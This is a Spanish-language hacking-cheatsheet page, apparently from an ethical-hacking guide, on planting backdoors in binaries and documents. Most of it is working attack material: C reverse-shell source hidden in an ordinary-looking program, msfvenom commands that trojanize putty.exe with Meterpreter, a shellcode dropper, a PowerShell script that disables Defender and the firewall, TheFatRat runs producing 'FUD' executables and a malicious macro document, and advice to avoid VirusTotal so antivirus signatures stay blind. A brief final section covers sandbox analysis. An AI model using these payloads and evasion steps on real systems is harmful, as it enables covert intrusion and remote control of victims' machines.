
# Backdoor en binarios

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir acceso a un sistema con un ejecutable o documento, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">**Backdoor en binario ELF (Linux)**</mark>

#### Objetivo: Insertar un *reverse shell* en un binario `.elf` Linux

Partiremos del siguiente ejemplo, un binario legítimo en C, que contiene solamente una funcionalidad de hacer un print de un mensaje:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("El programa se está ejecutando normalmente!\n");
    return 0;
}
```

Lo backdoorizaremos añadiendo una función de reverse shell, para que al ejecutarlo ganemos RCE en el objetivo

{% code title="backdoor.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void reverse_shell() { // Función maliciosa
    int sock;
    struct sockaddr_in attacker;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);  // Puerto atacante
    attacker.sin_addr.s_addr = inet_addr("IP_ATACANTE");  // IP atacante

    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
}

int main() {
    reverse_shell();  // Payload activado al ejecutar
    printf("El programa se está ejecutando normalmente!\n");
    return 0;
}
```

{% endcode %}

**Compilación en Kali Linux**

```bash
gcc backdoor.c -o backdoor
```

**Abrir Netcat listener**

```bash
nc -lvnp 4444
```

{% hint style="success" %}
Al ejecutarlo en el sistema Linux objetivo recibiremos una reverse shell.
{% endhint %}

***

## <mark style="color:purple;">Backdoor en binario EXE (Windows)</mark>

En este ejemplo vamos a backdoorizar `putty.exe`, pero podría ser cualquier otro ejecutable legítimo.&#x20;

PuTTY es un cliente de terminal ampliamente utilizado que admite varios protocolos de red, incluyendo SSH, Telnet y Rlogin, y está diseñado para ejecutar comandos en una variedad de sistemas operativos. Es popular entre los administradores de sistemas y desarrolladores para acceder de forma segura a servidores remotos y ejecutar aplicaciones de manera confiable.

Para probarlo lo ejecutaremos en la máquina Metasploitable 3 Windows:

{% content-ref url="/pages/oeb7yCOm8SMjwlcBGuRB" %}
[Metasploitable 3](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md)
{% endcontent-ref %}

### 1. Descargar putty.exe

```csharp
wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
```

### 2. Backdoor con MsfVenom

{% hint style="info" %}
Debes cambiar el LHOST y LPORT para que apunte a tu máquina atacante
{% endhint %}

```sh
msfvenom -x putty.exe -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.156 LPORT=4444 -e x86/shikata_ga_nai -i 1 -b "\x00" -f exe -o putty_backdoored.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 1709672 bytes
Saved as: putty_backdoored.exe
```

* Este método utiliza cifrado `shikata_ga_nai` para ofuscación de código y evasión de antivirus

{% hint style="success" %}
Esto nos genera un archivo `putty_backdoored.exe` que al ejecutarlo en la máquina objetivo nos devuelve un Meterpreter a nuestra máquina de atacante.
{% endhint %}

### 3. Enviar .exe backdoorizado a la máquina objetivo

```bash
python3 -m http.server 80
```

```bash
wget http://192.168.1.156/putty_backdoored.exe -o putty_backdoored.exe
```

### 4. Abrir un Listener Multi Handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.156; set LPORT 4444; run"
```

```shell
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.156
set LPORT 4444
run
```

* Al abrir el archivo `putty.exe` en la máquina objetivo nos abre una sesión de Meterpreter. Además vemos que se abre normalmente sin nada extraño, lo que es super transparente de cara al usuario

<figure><img src="/files/K7WLxtR8IjlWbtmNF8Cf" alt=""><figcaption></figcaption></figure>

```bash
[*] Started reverse TCP handler on 192.168.1.156:4444 
[*] Sending stage (203846 bytes) to 192.168.1.129
[*] Meterpreter session 1 opened (192.168.1.156:4444 -> 192.168.1.129:49676) at 2025-06-01 21:17:52 +0200

meterpreter > getuid
Server username: VAGRANT-2008R2\vagrant
```

## <mark style="color:purple;">Bypass de antivirus</mark>

Al enviarlo a una máquina Windows 11 con Defender habilitado lo detecta al instante, por lo que intentaremos bypassear el antivirus usando un shellcode y un dropper en C.

{% content-ref url="/pages/Je9uNudbLqx0yR746obF" %}
[Windows 11 Developer](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/windows-11-developer.md)
{% endcontent-ref %}

<figure><img src="/files/QafxPppTOlJQZf6bZRly" alt=""><figcaption></figcaption></figure>

### Backdoor en Shellcode C

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.153 LPORT=4448 \
-f c -o shellcode.c

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of c file: 2175 bytes
Saved as: shellcode.c
```

### Crear Dropper en C

{% code title="dropper.c" %}

```c
#include <windows.h>
#include <stdio.h>

unsigned char payload[] = {
  /* PEGA AQUÍ tu shellcode generado por msfvenom */
};

int main() {
    void *exec = VirtualAlloc(0, sizeof payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, sizeof payload);
    ((void(*)())exec)();
    return 0;
}
```

{% endcode %}

### Compilar para Windows 11

{% code title="En Kali" %}

```bash
x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -mwindows
```

{% endcode %}

Incluso con la evasión en Shellcode, Windows Defender lo detecta, por lo que lo deshabilitaremos manualmente.

### Deshabilitar Defender

{% hint style="success" %}
**Tip**: Puedes copiar todo el contenido y pegarlo en la PowerShell para evitar ir uno por uno
{% endhint %}

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Deshabilitar protección basada en la nube
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Una vez deshabilitado recibimos el binario sin problema.

### Abrir multi handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.153; set LPORT 4448; run"

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
LHOST => 192.168.1.153
LPORT => 4448
[*] Started reverse TCP handler on 192.168.1.153:4448 
```

### Ejecutar backdoor

Al ejecutarlo recibimos la shell Meterpreter:

```
[*] Started reverse TCP handler on 192.168.1.153:4448 
[*] Sending stage (203846 bytes) to 192.168.1.241
[*] Meterpreter session 1 opened (192.168.1.153:4448 -> 192.168.1.241:50534) at 2025-06-09 21:06:19 +0200

meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

***

## <mark style="color:purple;">Backdoors con TheFatRat</mark>

También podemos usar TheFatRat para generar backdoors en binarios y archivos de manera muy simple.

{% embed url="<https://github.com/screetsec/TheFatRat>" %}

<figure><img src="/files/iUgJ4Pz4obOFRx07PJA0" alt=""><figcaption></figcaption></figure>

### Instalación

```bash
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh
```

{% hint style="warning" %}
Se aconseja descargar la [última release](https://github.com/screetsec/TheFatRat/releases) de la herramienta.
{% endhint %}

{% hint style="danger" %}
**Importante**: No subir los ejecutabes a VirusTotal para evitar que lo detecten firmas de antivirus.
{% endhint %}

### Opción 1: Crear un ejecutable .exe

Probaremos todas las técnicas contra un sistema Windows 11 Developer.

```shell-session
afsh4ck@kali$ sudo fatrat

1) Create Backdoor With msfvenom
```

```bash
  ===================================================================== 
 |    Create Payload with msfvenom ( must install msfvenom )           | 
  ===================================================================== 
  ___________ 
 |           |======[***       ____                _             
 |  MSFVENOM  \ 	    / ___|_ __ ___  ____| |_ ___  _ __ 
 |_____________\_______      | |   | '__/ _ \/ _  | __/ _ \| '__|
 |==[v1.3 >]===========\     | |___| | |  __/ (_| | || (_) | |   
 |______________________\     \____|_|  \___|\____|\__\___/|_|    
  \(@)(@)(@)(@)(@)(@)(@)/ 
  *********************  

  ===================================================================== 
 |                             Created by  Edo Maland  ( Screetsec )   | 
  ===================================================================== 

 	[1]  LINUX >> FatRat.elf
	[2]  WINDOWS >> FatRat.exe
        [3]  SIGNED ANDROID >> FatRat.apk
	[4]  MAC >> FatRat.macho
	[5]  PHP >> FatRat.php
	[6]  ASP >> FatRat.asp
	[7]  JSP >> FatRat.jsp
	[8]  WAR >> FatRat.war
	[9]  Python >> FatRat.py 
	[10] Bash >> FatRat.sh
	[11] Perl >> FatRat.pl
	[12] doc >> Microsoft.doc ( not macro attack )
	[13] rar >> bacdoor.rar ( Winrar old version)
	[14] dll >> FatRat.dll
        [15] Back to Menu 
 
 ┌─[TheFatRat]──[~]─[creator]:
 └─────► 2 # Seleccionamos la opción 2 para WINDOWS
```

```bash
   Set LHOST IP: 192.168.1.163
   Set LPORT: 1234

   Please enter the base name for output files : rat

   +-------------------------------------------+
   | [ 1 ] windows/shell_bind_tcp              |
   | [ 2 ] windows/shell/reverse_tcp           |
   | [ 3 ] windows/meterpreter/reverse_tcp     |
   | [ 4 ] windows/meterpreter/reverse_tcp_dns |
   | [ 5 ] windows/meterpreter/reverse_http    |
   | [ 6 ] windows/meterpreter/reverse_https   |
   +-------------------------------------------+

   Choose Payload :3
```

#### Encriptación con Msfvenom

```
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes

Found 1 compatible encoders
Attempting to encode payload with 8 iterations of x86/countdown
x86/countdown succeeded with size 642 (iteration=0)
x86/countdown succeeded with size 660 (iteration=1)
x86/countdown succeeded with size 678 (iteration=2)
x86/countdown succeeded with size 696 (iteration=3)
x86/countdown succeeded with size 714 (iteration=4)
x86/countdown succeeded with size 732 (iteration=5)
x86/countdown succeeded with size 750 (iteration=6)
x86/countdown succeeded with size 768 (iteration=7)
x86/countdown chosen with final size 768
Payload size: 768 bytes

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 797 (iteration=0)
x86/jmp_call_additive chosen with final size 797
Payload size: 797 bytes

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 826 (iteration=0)
x86/call4_dword_xor chosen with final size 826
Payload size: 826 bytes

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 853 (iteration=0)
x86/shikata_ga_nai chosen with final size 853
Payload size: 853 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Fatrat_Generated/rat.exe
 
Your rat file was created and it is stored in : /root/Fatrat_Generated/rat.exe
```

Todos los payloads que genera esta herramienta se almacenan en la ruta:

```
/root/Fatrat_Generated
```

#### Abrimos un listener multi handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.163; set LPORT 1234; run"

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.163
LPORT => 1234
[*] Started reverse TCP handler on 192.168.1.163:1234 
[*] Sending stage (177734 bytes) to 192.168.1.241
[*] Meterpreter session 1 opened (192.168.1.163:1234 -> 192.168.1.241:51527) at 2025-06-11 21:15:32 +0200

meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

### Opción 2: Bypass de antivirus con FatRat

Con este ejemplo aplicaremos técnicas de evasión de antivirus con TheFatRat:

#### Crear un backdoor con Fudwin 1.0

{% code title="En TheFatRat" %}

```python
         ____							
        |    | 							
        |____| 							
       _|____|_       _____ _       _____     _   _____     _       
        /  ee\_      |_   _| |_ ___|   __|___| |_| __  |___| |_     
      .<     __O       | | |   | -_|   __| .'|  _|    -| .'|  _|	
     /\ \.-.' \        |_| |_|_|___|__|  |___|_| |__|__|___|_|  	
    J  \.|'.\/ \                  				
    | |_.|. | | |   [--]   Backdoor Creator for Remote Acces [--] 	
     \__.' .|-' /   [--]  Created by: Edo Maland (Screetsec) [--]	
     L   /|o'--'\   [--]            Version: 1.9.8           [--]	
     |  /\/\/\   \  [--]          Codename: Target          [--]    
     J /      \.__\ [--]   Follow me on Github: @Screetsec   [--]	
     J /      \.__\ [--]   Dracos Linux : @dracos-linux.org  [--]	
     |/         /   [--]    				    [--]		
       \      .'\.  [--]     SELECT AN OPTION TO BEGIN:      [--]  
    ____)_/\_(___\. [--] .___________________________________[--]	
   (___._/  \_.___)'\_.-----------------------------------------/	

  
	[01]  Create Backdoor with msfvenom
	[02]  Create Fud 100% Backdoor with Fudwin 1.0

 ┌─[TheFatRat]──[~]─[menu]:
 └─────► 2  # Seleccionamos la opción 2
```

{% endcode %}

```bash

	________                 ___       ______       _________       
	___  __ \__      __________ |     / /__(_)____________  /_______
	__  /_/ /_ | /| / /_  __ \_ | /| / /__  /__  __ \  __  /__  ___/
	_  ____/__ |/ |/ /_  / / /_ |/ |/ / _  / _  / / / /_/ / _(__  ) 
	/_/     ____/|__/ /_/ /_/____/|__/  /_/  /_/ /_/\__,_/  /____/  

	                         ______    
	                      .-        -. 
	                     /            \         
	                    |,  .-.  .-.  ,|      
	                    | )(_ /  \_ )( |
	                    |/     /\     \|    
	          (@_       <__    ^^    __>        
	     _     ) \_______\__|IIIIII|__/____________________ 
	    (_)\@8@8{}<________________________________________> 
	           )_/         \ IIIIII /                    
	          (@            --------                      
		           PwnWind Version  v1.5 
		       Pwned Windows with backdoor
 		     Author : Edo Maland (Screetsec)
  	    Powershell Injection attacks on any Windows Platform	          

	[1]  Create a bat file+Powershell (FUD 100%)
	[2]  Create exe file with C# + Powershell (FUD 100%) 
        [3]  Create exe file with apache + Powershell (FUD 100%)
	[4]  Create exe file with C + Powershell (FUD 98 %)
	[5]  Create Backdoor with C + Powershell + Embed Pdf (FUD 80%)
	[6]  Create Backdoor with C / Meteperter_reverse_tcp (FUD 97%)
	[7]  Create Backdoor with C / Metasploit Staging Protocol (FUD 98%)
	[8]  Create Backdoor with C to dll ( custom dll inject )
        [9]  Back to Menu 
 
 ┌─[TheFatRat]──[~]─[pwnwind]:
 └─────► 2
```

Seleccionamos la opción 2, y le indicamos IP, puerto, nombre del backdoor y el payload a utilizar:

```bash
  Set LHOST IP: 192.168.1.156
  Set LPORT: 4447

  Please enter the base name for output files :backdoor4447

   +-------------------------------------------+
   | [ 1 ] windows/shell_bind_tcp              |
   | [ 2 ] windows/shell/reverse_tcp           |
   | [ 3 ] windows/meterpreter/reverse_tcp     |
   | [ 4 ] windows/meterpreter/reverse_tcp_dns |
   | [ 5 ] windows/meterpreter/reverse_http    |
   | [ 6 ] windows/meterpreter/reverse_https   |
   +-------------------------------------------+

   Choose Payload :3
   
   <----SNIP---->
   [ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  ]

Backdoor Saved To : /root/Fatrat_Generated/backdoor4447.exe
```

Eso nos guarda el backdoor en `/root/Fatrat_Generated`:

```bash
┌──(root㉿kali)-[~/Fatrat_Generated]
└─# ls

backdoor4447.exe
```

#### Envío del binario al objetivo

```bash
┌──(root㉿kali)-[~/Fatrat_Generated]
└─# python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
wget http://192.168.1.156:8080/backdoor4447.exe -o backdoor4447.exe
```

{% hint style="warning" %}
Incluso con todas las medidas anti evasión, Defender lo detecta al instante en Windows 11
{% endhint %}

<figure><img src="/files/fLn6Ew9u9NZXVb9XUvPo" alt=""><figcaption></figcaption></figure>

#### Desactivar Defender

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Deshabilitar protección basada en la nube
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Una vez deshabilitado podemos enviarlo sin problema:

<figure><img src="/files/iubTjRiRiNElTqXG9VP2" alt=""><figcaption></figcaption></figure>

#### Abrimos un multi/handler

```python
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.156; set LPORT 4447; run"
```

```
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.156
LPORT => 4447
[*] Started reverse TCP handler on 192.168.1.156:4447 
```

* Ejecutar el .exe en la máquina destino

#### Recibimos shell Meterpreter

```bash
[*] Started reverse TCP handler on 192.168.1.156:4447 
[*] Sending stage (177734 bytes) to 192.168.1.241
[*] Meterpreter session 1 opened (192.168.1.156:4447 -> 192.168.1.241:51210) at 2025-06-06 14:12:48 +0200

meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

### Opción 3: Crear documento malicioso

Usaremos la opción 7 de Backdoor for Office

```bash
         ____							
        |    | 							
        |____| 							
       _|____|_       _____ _       _____     _   _____     _       
        /  ee\_      |_   _| |_ ___|   __|___| |_| __  |___| |_     
      .<     __O       | | |   | -_|   __| .'|  _|    -| .'|  _|	
     /\ \.-.' \        |_| |_|_|___|__|  |___|_| |__|__|___|_|  	
    J  \.|'.\/ \                  				
    | |_.|. | | |   [--]   Backdoor Creator for Remote Acces [--] 	
     \__.' .|-' /   [--]  Created by: Edo Maland (Screetsec) [--]	
     L   /|o'--'\   [--]            Version: 1.9.8           [--]	
     |  /\/\/\   \  [--]          Codename: Target          [--]    
     J /      \.__\ [--]   Follow me on Github: @Screetsec   [--]	
     J /      \.__\ [--]   Dracos Linux : @dracos-linux.org  [--]	
     |/         /   [--]    				    [--]		
       \      .'\.  [--]     SELECT AN OPTION TO BEGIN:      [--]  
    ____)_/\_(___\. [--] .___________________________________[--]	
   (___._/  \_.___)'\_.-----------------------------------------/	

  
	[01]  Create Backdoor with msfvenom
	[02]  Create Fud 100% Backdoor with Fudwin 1.0
	[03]  Create Fud Backdoor with Avoid v1.2  
	[04]  Create Fud Backdoor with backdoor-factory [embed] 
	[05]  Backdooring Original apk [Instagram, Line,etc] 
	[06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
	[07]  Create Backdoor For Office with Microsploit 
        <---SNIP--->
 
 ┌─[TheFatRat]──[~]─[menu]:
 └─────► 7
```

```bash
  <==============================================>
  ||  _____ _             _____     _     _ _    ||
  || |     |_|___ ___ ___|   __|___| |___|_| |_  ||
  || | | | | |  _|  _| . |__   | . | | . | |  _| ||
  || |_|_|_|_|___|_| |___|_____|  _|_|___|_|_|   ||
  ||                           | |               ||
  <===================================================>
	||   |=| Microsfot Metasploit Packet [ Easy ] ||
	||   |=| Version : 1.0.0 		     ||
	||   |=| Code by : Screetsec - Edo Malad      || 
	||   |=| Codename: Mario Bros  		     || 
	||============================================||

  |1| Microsoft Stack overflow in MSCOMCTL.OCX
  |2| The Microsoft Office Macro on Windows 
  |3| The Microsoft Office Macro on Mac OS X 
  |4| Apache OpenOffice on Windows (PSH)
  |5| Apache OpenOffice on Linux/OSX (Python)
  |6| Exit

 ┌─[TheFatRat]──[~]─[microsploit]:
 └─────► 2

   Worked on Microsoft Office on Windows  
   
   Set LHOST IP: 192.168.1.153
   Set LPORT: 4449

   Enter the base name for output files : exploit4449
   Enter the message for the document body (ENTER = default) : Pwn3d

   Are u want Use custom exe file backdoor ( y/n ): n

[ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++    ]

   +-------------------------------------------+
   | [ 1 ] windows/shell_bind_tcp              |
   | [ 2 ] windows/shell/reverse_tcp           |
   | [ 3 ] windows/meterpreter/reverse_tcp     |
   | [ 4 ] windows/meterpreter/reverse_tcp_dns |
   | [ 5 ] windows/meterpreter/reverse_http    |
   | [ 6 ] windows/meterpreter/reverse_https   |
   +-------------------------------------------+

   Choose Payload :3

[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   ]

  Backdoor doc Saved To : /root/Fatrat_Generated/exploit4449.docm
```

### Desactivamos Defender

{% hint style="warning" %}
Importante o será detectado en nuevas versiones de Windows
{% endhint %}

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Deshabilitar protección basada en la nube
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Iniciamos multi handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.153; set LPORT 4449; run"

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.153
LPORT => 4449
[*] Started reverse TCP handler on 192.168.1.153:4449
```

### Iniciamos la macro

Al hacer click en el enlace del documento que nos genera FatRat recibimos una shell Meterpreter:

<figure><img src="/files/XqENekctzS54LPgrfzky" alt=""><figcaption></figcaption></figure>

```bash
[*] Started reverse TCP handler on 192.168.1.153:4449 
[*] Sending stage (177734 bytes) to 192.168.1.241
[*] Meterpreter session 1 opened (192.168.1.153:4449 -> 192.168.1.241:50451) at 2025-06-09 20:31:59 +0200

meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

***

## <mark style="color:purple;">Análisis de binarios</mark>

Vamos a analizar alguno de los binarios que hemos generado con técnicas forenses.

{% hint style="danger" %}
Importante: No subir los binarios generados con FatRat a VirusTotal para evitar la detección de las firmas de antivirus, usar en su defecto anyrun.
{% endhint %}

### Obtener el hash del malware

Esto suele ser útil cuando analizamos virus o malware popular y ampliamente distribuido, como por ejemplo el ransomware wannacry. El hash generado lo podemos analizar con herramientas como VirusTotal o AnyRun.

```bash
┌──(root㉿kali)-[~/Fatrat_Generated]
└─# md5sum rat.exe 
b8b602cd0a3241459f0e43d7f770e5c6  rat.exe
```

### Análisis con AnyRun

Subimos el binario a AnyRun para analizar su comportamiento:

{% embed url="<https://app.any.run>" %}

<figure><img src="/files/d7z36x0amkGj6SCuYjPJ" alt=""><figcaption></figcaption></figure>

Inmediatamente nos detecta METASPLOIT, el tamaño y la dirección de memoria:

<figure><img src="/files/kXYkHa9uzNxWchzJ9AUC" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/QkUQadNlD84HpvJViN8K" alt=""><figcaption></figcaption></figure>

#### IOCs (Indicators of Compromise)

AnyRun automáticamente genera el hash SHA512 del binario para comprobar la integridad y las conexiones que realiza.

Esto es especialmente útil para detectar una máquina atacante en un entorno Enterprise o la red local en la que se ejecuta el malware.

De esta manera podríamos directamente bloquear esta IP desde un SOC para cortar la amenaza.

<figure><img src="/files/3ecCXhvqblnsvjJMVrRu" alt=""><figcaption></figcaption></figure>

#### Generar reporte del malware

Hacemos click en Text report:

<figure><img src="/files/XSc29v3T8b1ABQ10lypD" alt=""><figcaption></figcaption></figure>

Nos genera un reporte HTML navegable:

{% hint style="warning" %}
Para exportar los resultados en archivos html, json, etc... necesitamos el plan de pago
{% endhint %}

<figure><img src="/files/uHu0A0TPqpLMTAYeedGi" alt=""><figcaption></figcaption></figure>

### Análisis con filescan.io

Filescan.io es una plataforma que proporciona análisis avanzados de archivos y URLs para detectar posibles amenazas y generar informes detallados. Ofrece una gama de características que incluyen escaneo de malware, análisis de comportamiento y extracción de metadatos, lo que la convierte en una herramienta útil para investigadores de seguridad y profesionales de TI.

{% embed url="<https://www.filescan.io>" %}

<figure><img src="/files/FMsb7J6vSmXw4kI0lJsy" alt=""><figcaption></figcaption></figure>

Esta herramienta nos da un análisis más detallado y nos permite descargar el informe:

<figure><img src="/files/AHd9EwG9Xn6ghXNBTl26" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Relacionado</mark>

{% content-ref url="/pages/O5p5YWoD0JklHB9mDMAb" %}
[Meterpreter](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/meterpreter.md)
{% endcontent-ref %}

{% content-ref url="/pages/TlXO5KvukiJrW7DmNLjK" %}
[Msfvenom](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom.md)
{% endcontent-ref %}

{% content-ref url="/pages/8S7228bkDNukCB9ji4TT" %}
[Evasión de Antivirus](/ethical-hacking-cheatsheet/evasion-de-defensas/deteccion-y-evasion-de-defensas/evasion-de-antivirus.md)
{% endcontent-ref %}
